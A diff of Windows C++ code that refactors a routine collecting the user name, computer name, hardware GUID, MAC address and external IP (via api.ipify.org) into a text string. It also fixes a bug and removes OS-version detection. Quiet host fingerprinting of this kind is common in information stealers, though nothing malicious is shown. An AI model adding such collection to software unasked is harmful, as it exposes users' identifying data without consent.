@@ -31,12 +31,7 @@
 #include <ctime>
 #include <sstream>
 #include <iphlpapi.h>
-#define CURL_STATICLIB
 #include <curl\curl.h>
-
-
-#define _CRT_SECURE_NO_WARNINGS
-
 
 namespace global 
 {
@@ -64,8 +59,6 @@ namespace global
 /// </summary>
 void GetGeneralInfo();
 
-size_t WriteCallback(char* , size_t , size_t , std::string* );
-
 void cursystem::GetSysInfo()
 {
 	TCHAR string[UNLEN + 1];
@@ -89,6 +82,12 @@ void cursystem::GetSysInfo()
 	file.close();
 }
 
+size_t WriteCallbackInfo(char* contents, size_t size, size_t nmemb, std::string* output) {
+	size_t totalSize = size * nmemb;
+	output->append(contents, totalSize);
+	return totalSize;
+}
+
 void GetGeneralInfo() 
 {
 	std::time_t currentTime = std::time(nullptr);
@@ -109,75 +108,24 @@ void GetGeneralInfo()
 
 	global::info += "User name: " + userName + '\n';
 
-	CHAR s[UNLEN + 1];
-	DWORD size = UNLEN + 1;
-	GetComputerName((TCHAR*)s, &size);
-	std::wstring ws(s);
-	std::string pcName(ws.begin(), ws.end());
+	TCHAR str[UNLEN + 1];
+	DWORD sizethis1 = UNLEN + 1;
+	GetComputerName((TCHAR*)str, &sizethis1);
+	std::wstring ws1(str);
+	std::string pcName(ws1.begin(), ws1.end());
 
-	global::info += "PC name: " + userName + '\n';
+	global::info += "PC name: " + pcName + '\n';
 
-    OSVERSIONINFOEX osInfo;
-    ZeroMemory(&osInfo, sizeof(OSVERSIONINFOEX));
-    osInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
-
-    if (GetVersionEx(reinterpret_cast<OSVERSIONINFO*>(&osInfo))) {
-        std::string osType;
-        if (osInfo.dwMajorVersion == 10) {
-            if (osInfo.dwMinorVersion == 0)
-                osType = "Windows 10";
-            else if (osInfo.dwMinorVersion == 1)
-                osType = "Windows 10 (November 2019 Update or later)";
-            else
-                osType = "Windows 10";
-        }
-        else if (osInfo.dwMajorVersion == 6) {
-            if (osInfo.dwMinorVersion == 0)
-                osType = "Windows Vista";
-            else if (osInfo.dwMinorVersion == 1)
-                osType = "Windows 7";
-            else if (osInfo.dwMinorVersion == 2) {
-                if (osInfo.wProductType == VER_NT_WORKSTATION && osInfo.wSuiteMask == VER_SUITE_PERSONAL)
-                    osType = "Windows 8.1 (Home Edition)";
-                else
-                    osType = "Windows 8.1";
-            }
-        }
-        else if (osInfo.dwMajorVersion == 5 && osInfo.dwMinorVersion == 2) {
-            if (GetSystemMetrics(SM_SERVERR2))
-                osType = "Windows Server 2003 R2";
-            else if (osInfo.wSuiteMask & VER_SUITE_STORAGE_SERVER)
-                osType = "Windows Storage Server 2003";
-            else if (osInfo.wProductType == VER_NT_WORKSTATION && osInfo.wSuiteMask == VER_SUITE_PERSONAL)
-                osType = "Windows XP (Home Edition)";
-            else
-                osType = "Windows Server 2003";
-        }
-        else if (osInfo.dwMajorVersion == 5 && osInfo.dwMinorVersion == 1) {
-            osType = "Windows XP";
-        }
-        else if (osInfo.dwMajorVersion == 5 && osInfo.dwMinorVersion == 0) {
-            osType = "Windows 2000";
-        }
-        else {
-            osType = "Unknown Windows Version";
-        }
-
-        global::info += "Windows OS Type: " + osType + '\n';
-    }
-    else {
-        global::info += "Windows OS Type: Failed to retrieve OS information." + '\n';
-    }
 
 
     HW_PROFILE_INFO hwProfileInfo;
     GetCurrentHwProfile(&hwProfileInfo);
-    std::wstring ws(hwProfileInfo.szHwProfileGuid);
-    std::string HWID(ws.begin(), ws.end());
+    std::wstring wstr(hwProfileInfo.szHwProfileGuid);
+    std::string HWID(wstr.begin(), wstr.end());
     size_t end = std::size(HWID);
     HWID = HWID.substr(1, end - 2);
 
-    global::info += "Hwid: " + HWID;
+    global::info += "Hwid: " + HWID + '\n';
 
 	IP_ADAPTER_INFO adapterInfo[16];
 	DWORD bufferSize = sizeof(adapterInfo);
@@ -224,15 +172,15 @@ void GetGeneralInfo()
 
 	mac = mac.substr(1, std::size(mac) - 2);
 
-	global::info += "MAC Address: " + mac;
-
+	global::info += "MAC Address: " + mac + '\n';
 
 	std::string ipAddress = "";
+
 
 	CURL* curl = curl_easy_init();
 	if (curl) {
 		curl_easy_setopt(curl, CURLOPT_URL, "https://api.ipify.org");
-		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
+		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallbackInfo);
 		curl_easy_setopt(curl, CURLOPT_WRITEDATA, &ipAddress);
 
 		CURLcode res = curl_easy_perform(curl);
@@ -243,13 +191,7 @@ void GetGeneralInfo()
 		curl_easy_cleanup(curl);
 	}
 	
-	global::info += "External IP Address: " + ipAddress;
+	global::info += "External IP Address: " + ipAddress + '\n';
 
 
-}
-
-size_t WriteCallback(char* contents, size_t size, size_t nmemb, std::string* output) {
-	size_t totalSize = size * nmemb;
-	output->append(contents, totalSize);
-	return totalSize;
 }
